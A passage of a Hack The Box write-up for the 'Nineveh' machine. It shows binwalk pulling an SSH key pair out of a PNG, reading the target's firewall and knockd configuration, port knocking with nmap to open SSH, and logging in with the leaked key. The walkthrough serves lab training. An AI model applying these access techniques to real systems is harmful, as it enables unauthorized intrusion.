+<span class="nc">DECIMAL</span><span class="w">       </span><span class="n">HEXADECIMAL</span><span class="w">     </span><span class="n">DESCRIPTION</span><span class="w"></span>
+<span class="c1">--------------------------------------------------------------------------------</span>
+<span class="mi">0</span><span class="w">             </span><span class="mh">0x0</span><span class="w">             </span><span class="n">PNG</span><span class="w"> </span><span class="nc">image</span><span class="p">,</span><span class="w"> </span><span class="mi">1497</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="mi">746</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="o">-</span><span class="nc">bit</span><span class="o">/</span><span class="n">color</span><span class="w"> </span><span class="n">RGB</span><span class="p">,</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">interlaced</span><span class="w"></span>
+<span class="mi">84</span><span class="w">            </span><span class="mh">0x54</span><span class="w">            </span><span class="n">Zlib</span><span class="w"> </span><span class="n">compressed</span><span class="w"> </span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="n">compression</span><span class="w"></span>
+<span class="mi">2881744</span><span class="w">       </span><span class="mh">0x2BF8D0</span><span class="w">        </span><span class="n">POSIX</span><span class="w"> </span><span class="n">tar</span><span class="w"> </span><span class="n">archive</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<p>The <strong>binwalk</strong> command against the picure shows us there is a Zlib compressed folder inside the image. To extract it we run again the same command with the <strong>-Me</strong> option</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="err">#</span><span class="w"> </span><span class="n">binwalk</span><span class="w"> </span><span class="o">-</span><span class="n">Me</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">png</span><span class="w">                                                                                                                     </span>
+
+<span class="n">Scan</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w">     </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">16</span><span class="err">:</span><span class="mi">04</span><span class="w">                                                                                                                                                            </span>
+<span class="n">Target</span><span class="w"> </span><span class="k">File</span><span class="err">:</span><span class="w">   </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="o">/</span><span class="n">nineveh</span><span class="p">.</span><span class="n">png</span><span class="w">                                                                                                                             </span>
+<span class="n">MD5</span><span class="w"> </span><span class="nf">Checksum</span><span class="err">:</span><span class="w">  </span><span class="mi">353</span><span class="n">b8f5a4578e4472c686b6e1f15c808</span><span class="w">                                                                                                                                               </span>
+<span class="nl">Signatures</span><span class="p">:</span><span class="w">    </span><span class="mi">391</span><span class="w">                                                                                                                                                                            </span>
+
+<span class="nc">DECIMAL</span><span class="w">       </span><span class="n">HEXADECIMAL</span><span class="w">     </span><span class="n">DESCRIPTION</span><span class="w">                                                                                                                                                     </span>
+<span class="c1">--------------------------------------------------------------------------------</span>
+<span class="mi">0</span><span class="w">             </span><span class="mh">0x0</span><span class="w">             </span><span class="n">PNG</span><span class="w"> </span><span class="nc">image</span><span class="p">,</span><span class="w"> </span><span class="mi">1497</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="mi">746</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="o">-</span><span class="nc">bit</span><span class="o">/</span><span class="n">color</span><span class="w"> </span><span class="n">RGB</span><span class="p">,</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">interlaced</span><span class="w"></span>
+<span class="mi">84</span><span class="w">            </span><span class="mh">0x54</span><span class="w">            </span><span class="n">Zlib</span><span class="w"> </span><span class="n">compressed</span><span class="w"> </span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="n">compression</span><span class="w"></span>
+<span class="mi">2881744</span><span class="w">       </span><span class="mh">0x2BF8D0</span><span class="w">        </span><span class="n">POSIX</span><span class="w"> </span><span class="n">tar</span><span class="w"> </span><span class="n">archive</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="p">)</span><span class="w"></span>
+
+
+<span class="n">Scan</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w">     </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">16</span><span class="err">:</span><span class="mi">04</span><span class="w"></span>
+<span class="n">Target</span><span class="w"> </span><span class="k">File</span><span class="err">:</span><span class="w">   </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="o">/</span><span class="n">_nineveh</span><span class="p">.</span><span class="n">png</span><span class="p">.</span><span class="n">extracted</span><span class="o">/</span><span class="mi">54</span><span class="w"></span>
+<span class="n">MD5</span><span class="w"> </span><span class="nf">Checksum</span><span class="err">:</span><span class="w">  </span><span class="n">d41d8cd98f00b204e9800998ecf8427e</span><span class="w"> </span>
+<span class="nl">Signatures</span><span class="p">:</span><span class="w">    </span><span class="mi">391</span><span class="w"></span>
+
+<span class="nc">DECIMAL</span><span class="w">       </span><span class="n">HEXADECIMAL</span><span class="w">     </span><span class="n">DESCRIPTION</span><span class="w"></span>
+<span class="c1">--------------------------------------------------------------------------------</span>
+
+
+<span class="n">Scan</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w">     </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">16</span><span class="err">:</span><span class="mi">04</span><span class="w"></span>
+<span class="n">Target</span><span class="w"> </span><span class="k">File</span><span class="err">:</span><span class="w">   </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="o">/</span><span class="n">_nineveh</span><span class="p">.</span><span class="n">png</span><span class="p">.</span><span class="n">extracted</span><span class="o">/</span><span class="n">secret</span><span class="o">/</span><span class="n">nineveh</span><span class="p">.</span><span class="n">priv</span><span class="w"></span>
+<span class="n">MD5</span><span class="w"> </span><span class="nf">Checksum</span><span class="err">:</span><span class="w">  </span><span class="n">f426d661f94b16292efc810ebb7ea305</span><span class="w"> </span>
+<span class="nl">Signatures</span><span class="p">:</span><span class="w">    </span><span class="mi">391</span><span class="w"></span>
+
+<span class="nc">DECIMAL</span><span class="w">       </span><span class="n">HEXADECIMAL</span><span class="w">     </span><span class="n">DESCRIPTION</span><span class="w"></span>
+<span class="c1">--------------------------------------------------------------------------------</span>
+<span class="mi">0</span><span class="w">             </span><span class="mh">0x0</span><span class="w">             </span><span class="n">PEM</span><span class="w"> </span><span class="n">RSA</span><span class="w"> </span><span class="n">private</span><span class="w"> </span><span class="k">key</span><span class="w"></span>
+
+
+<span class="n">Scan</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w">     </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">16</span><span class="err">:</span><span class="mi">04</span><span class="w"></span>
+<span class="n">Target</span><span class="w"> </span><span class="k">File</span><span class="err">:</span><span class="w">   </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="o">/</span><span class="n">_nineveh</span><span class="p">.</span><span class="n">png</span><span class="p">.</span><span class="n">extracted</span><span class="o">/</span><span class="n">secret</span><span class="o">/</span><span class="n">nineveh</span><span class="p">.</span><span class="n">pub</span><span class="w"> </span>
+<span class="n">MD5</span><span class="w"> </span><span class="nf">Checksum</span><span class="err">:</span><span class="w">  </span><span class="mi">6</span><span class="n">b60618d207ad97e76664174e805cfda</span><span class="w"> </span>
+<span class="nl">Signatures</span><span class="p">:</span><span class="w">    </span><span class="mi">391</span><span class="w"></span>
+
+<span class="nc">DECIMAL</span><span class="w">       </span><span class="n">HEXADECIMAL</span><span class="w">     </span><span class="n">DESCRIPTION</span><span class="w"></span>
+<span class="c1">--------------------------------------------------------------------------------</span>
+<span class="mi">0</span><span class="w">             </span><span class="mh">0x0</span><span class="w">             </span><span class="n">OpenSSH</span><span class="w"> </span><span class="n">RSA</span><span class="w"> </span><span class="k">public</span><span class="w"> </span><span class="k">key</span><span class="w"></span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/nineveh# ll</span>
+<span class="err">total 2840</span>
+<span class="err">-rwxrwxrwx 1 root root 2891984 Jan 19 15:09 nineveh.png</span>
+<span class="err">drwxrwxr-x 3 root root    4096 Jan 19 15:16 _nineveh.png.extracted</span>
+<span class="err">-rwxr-xr-x 1 root root     514 Jan  5 08:32 post.html</span>
+<span class="err">-rwxr-xr-x 1 root root    3251 Jan 19 11:59 shell.php</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/nineveh# cd _nineveh.png.extracted/</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted# ll</span>
+<span class="err">total 2844</span>
+<span class="err">-rw-rw-r-- 1 root     root       10240 Jan 19 15:16 2BF8D0.tar</span>
+<span class="err">-rw-rw-r-- 1 root     root           0 Jan 19 15:16 54</span>
+<span class="err">-rw-rw-r-- 1 root     root     2891900 Jan 19 15:16 54.zlib</span>
+<span class="err">drwxr-xr-x 2 www-data www-data    4096 Jul  2  2017 secret</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted# cd secret/</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret# ll</span>
+<span class="err">total 8</span>
+<span class="err">-rw------- 1 www-data www-data 1675 Jul  2  2017 nineveh.priv</span>
+<span class="err">-rw-r--r-- 1 www-data www-data  400 Jul  2  2017 nineveh.pub</span>
+</pre></div>
+
+
+<p>There is a private/public key pair we can potentially use to ssh to the box. We can try to use the user <strong>amrois</strong> we found in the /etc/passwd output. </p>
+<p>Our initial <strong>nmap</strong> had not revealed port 22 as opened but I remembered that when I ran LinEnum.sh I saw this:</p>
+<div class="highlight"><pre><span></span><span class="err">[-] Listening TCP:                                                                             </span>
+<span class="err">Active Internet connections (only servers)                                                                                                                                                    </span>
+<span class="err">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
+<span class="err">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                </span>
+<span class="err">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                </span>
+<span class="err">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                                                                                                             </span>
+<span class="err">tcp6       0      0 :::22                   :::*                    LISTEN      -                  </span>
+</pre></div>
+
+
+<p>In reality port 22 is listening as we can see above. The reason the nmap did not reveal is because of iptables which only allows connections for port 80 and 443:</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@nineveh:/$ cat /etc/iptables/rules.v4</span>
+<span class="err"># Generated by iptables-save v1.6.0 on Sun Jul  2 19:37:15 2017</span>
+<span class="err">*filter</span>
+<span class="err">:INPUT ACCEPT [0:0]</span>
+<span class="err">:FORWARD ACCEPT [0:0]</span>
+<span class="err">:OUTPUT ACCEPT [140:21895]</span>
+<span class="err">-A INPUT -p icmp -j ACCEPT</span>
+<span class="err">-A INPUT -i lo -j ACCEPT</span>
+<span class="err">-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span>
+<span class="err">-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span>
+<span class="err">-A INPUT -p tcp -m tcp --dport 443 -j ACCEPT</span>
+<span class="err">-A INPUT -j DROP</span>
+<span class="err">COMMIT</span>
+<span class="err"># Completed on Sun Jul  2 19:37:15 2017</span>
+</pre></div>
+
+
+<p>I went back to LinEnum output and I found that the knockd daemon is running:</p>
+<div class="highlight"><pre><span></span><span class="err">root      1282  1.1  0.2   8756  2228 ?        Ss   04:11   2:52 /usr/sbin/knockd -d -i ens33</span>
+</pre></div>
+
+
+<p>and the below could be the configuration file:</p>
+<div class="highlight"><pre><span></span><span class="err">-rw-r--r-- 1 root root 354 Aug  5  2017 /etc/knockd.conf</span>
+</pre></div>
+
+
+<p>The knockd daemon is needed to have the so called <strong>Port Knocking</strong> mechanism work properly.</p>
+<p>Port knocking is a mechanism used to enable remote access without leaving a port open constantly. This helps protecting a port being used from port scanning.</p>
+<p>To use port knocking, the server must have a firewall and run the knock-daemon, /usr/sbin/knockd. The daemon is listening for a specific sequence of TCP or UDP packets, if the sequence of packets is correct, then usually the source IP address of the port knocking is given access through the firewall to the assigned knocking port. </p>
+<div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@nineveh</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">knockd</span><span class="p">.</span><span class="n">conf</span><span class="w"> </span>
+<span class="o">[</span><span class="n">options</span><span class="o">]</span><span class="w"></span>
+<span class="w"> </span><span class="n">logfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="nf">log</span><span class="o">/</span><span class="n">knockd</span><span class="p">.</span><span class="nf">log</span><span class="w"></span>
+<span class="w"> </span><span class="n">interface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ens33</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">openSSH</span><span class="o">]</span><span class="w"></span>
+<span class="w"> </span><span class="k">sequence</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">571</span><span class="p">,</span><span class="w"> </span><span class="mi">290</span><span class="p">,</span><span class="w"> </span><span class="mi">911</span><span class="w"> </span>
+<span class="w"> </span><span class="n">seq_timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="w"></span>
+<span class="w"> </span><span class="n">start_command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">iptables</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="k">INPUT</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">%</span><span class="n">IP</span><span class="o">%</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="c1">--dport 22 -j ACCEPT</span>
+<span class="w"> </span><span class="n">tcpflags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">syn</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">closeSSH</span><span class="o">]</span><span class="w"></span>
+<span class="w"> </span><span class="k">sequence</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">911</span><span class="p">,</span><span class="mi">290</span><span class="p">,</span><span class="mi">571</span><span class="w"></span>
+<span class="w"> </span><span class="n">seq_timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="w"></span>
+<span class="w"> </span><span class="n">start_command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">iptables</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="k">INPUT</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">%</span><span class="n">IP</span><span class="o">%</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="c1">--dport 22 -j ACCEPT</span>
+<span class="w"> </span><span class="n">tcpflags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">syn</span><span class="w"></span>
+</pre></div>
+
+
+<p>From the above configuration file we can see that the port sequense for openSSH is 571, 290, 911. If our kali machine sends three TCP packets to these ports in this exact sequence then port 22 will be open.</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mf">10.10.10.43</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">53</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.43</span><span class="p">)</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.024</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w">    </span><span class="n">SERVICE</span><span class="w"></span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ssh</span><span class="w"></span>
+
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">0.37</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>Before starting to test this, we can see the above output shows that port 22 is filtered (by iptables in this case).</p>
+<p>Looking online I found out that it is possible to use nmap and I found a command <a href="https://wiki.archlinux.org/index.php/Port_knocking">here</a> which will be useful. This is the script:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Tools</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="c1">--host-timeout 100 --max-retries 0  -p 571,290,911 10.10.10.43</span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">11</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.10.43</span><span class="w"> </span><span class="n">giving</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">retransmission</span><span class="w"> </span><span class="n">cap</span><span class="w"> </span><span class="n">hit</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.43</span><span class="p">)</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="p">.</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w">    </span><span class="n">SERVICE</span><span class="w"></span>
+<span class="mi">290</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">571</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">umeter</span><span class="w"></span>
+<span class="mi">911</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">xact</span><span class="o">-</span><span class="k">backup</span><span class="w"></span>
+</pre></div>
+
+
+<p>I ran the above command few times and when I check again for por 22 I get this:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Tools</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mf">10.10.10.43</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">11</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">nineveh</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.43</span><span class="p">)</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.017</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"></span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w"></span>
+
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">0.14</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>Now port 22 is open and we can try to SSH.</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">nineveh</span><span class="o">/</span><span class="n">_nineveh</span><span class="p">.</span><span class="n">png</span><span class="p">.</span><span class="n">extracted</span><span class="o">/</span><span class="n">secret</span><span class="err">#</span> <span class="n">ssh</span> <span class="n">amrois</span><span class="mf">@10.10.10.43</span> <span class="o">-</span><span class="n">i</span> <span class="n">nineveh</span><span class="p">.</span><span class="n">priv</span>
+<span class="n">Ubuntu</span> <span class="mf">16.04.2</span> <span class="n">LTS</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">16.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">4.4.0</span><span class="o">-</span><span class="mi">62</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="nl">Documentation</span><span class="p">:</span>  <span class="nl">https</span><span class="p">:</span><span class="c1">//help.ubuntu.com</span>
+ <span class="o">*</span> <span class="nl">Management</span><span class="p">:</span>     <span class="nl">https</span><span class="p">:</span><span class="c1">//landscape.canonical.com</span>
+ <span class="o">*</span> <span class="nl">Support</span><span class="p">:</span>        <span class="nl">https</span><span class="p">:</span><span class="c1">//ubuntu.com/advantage</span>
+
+<span class="mi">133</span> <span class="n">packages</span> <span class="n">can</span> <span class="n">be</span> <span class="n">updated</span><span class="p">.</span>
+<span class="mi">66</span> <span class="n">updates</span> <span class="n">are</span> <span class="n">security</span> <span class="n">updates</span><span class="p">.</span>
+
+
+<span class="n">You</span> <span class="n">have</span> <span class="n">mail</span><span class="p">.</span>
+<span class="n">Last</span> <span class="nl">login</span><span class="p">:</span> <span class="n">Sun</span> <span class="n">Jan</span> <span class="mi">19</span> <span class="mi">15</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">39</span> <span class="mi">2020</span> <span class="n">from</span> <span class="mf">10.10.14.5</span>
+
+<span class="n">amrois</span><span class="p">@</span><span class="nl">nineveh</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="kt">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">amrois</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">amrois</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">amrois</span><span class="p">)</span>
+</pre></div>
+
+
+<p>Finally we are in as the user <strong>amrois</strong> and we can get the user.txt</p>
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:~$ cat user.txt </span>
+<span class="err">82############################c8</span>
+</pre></div>
+
+
+<p>Looking around I notice there a non-default directory calle report which is owned by the user amrois:</p>
+<div class="highlight"><pre><span></span><span class="err">amrois@nineveh:/$ ll</span>
+<span class="err">total 100</span>
+<span class="err">drwxr-xr-x  24 root   root    4096 Jul  2  2017 ./</span>
+<span class="err">drwxr-xr-x  24 root   root    4096 Jul  2  2017 ../</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Jul  2  2017 bin/</span>
+<span class="err">drwxr-xr-x   3 root   root    4096 Jul  2  2017 boot/</span>
+<span class="err">drwxr-xr-x  19 root   root    4240 Jan 19 04:11 dev/</span>
+<span class="err">drwxr-xr-x  93 root   root    4096 Aug  5  2017 etc/</span>
+<span class="err">drwxr-xr-x   3 root   root    4096 Jul  2  2017 home/</span>
+<span class="err">lrwxrwxrwx   1 root   root      32 Jul  2  2017 initrd.images -&gt; boot/initrd.images-4.4.0-62-generic</span>
+<span class="err">drwxr-xr-x  22 root   root    4096 Jul  2  2017 lib/</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Jul  2  2017 lib64/</span>
+<span class="err">drwx------   2 root   root   16384 Jul  2  2017 lost+found/</span>
+<span class="err">drwxr-xr-x   3 root   root    4096 Jul  2  2017 media/</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Feb 15  2017 mnt/</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Feb 15  2017 opt/</span>
+<span class="err">dr-xr-xr-x 208 root   root       0 Jan 19 04:11 proc/</span>
+<span class="err">drwxr-xr-x   2 amrois amrois  4096 Jan 19 15:20 report/</span>
+<span class="err">drwx------   4 root   root    4096 Jul 19  2017 root/</span>
+<span class="err">drwxr-xr-x  23 root   root     900 Jan 19 15:16 run/</span>
+<span class="err">drwxr-xr-x   2 root   root   12288 Jul  2  2017 sbin/</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Jan 14  2017 snap/</span>
+<span class="err">drwxr-xr-x   2 root   root    4096 Feb 15  2017 srv/</span>
+<span class="err">dr-xr-xr-x  13 root   root       0 Jan 19 06:11 sys/</span>
+<span class="err">drwxrwxrwt   9 root   root    4096 Jan 19 15:20 tmp/</span>
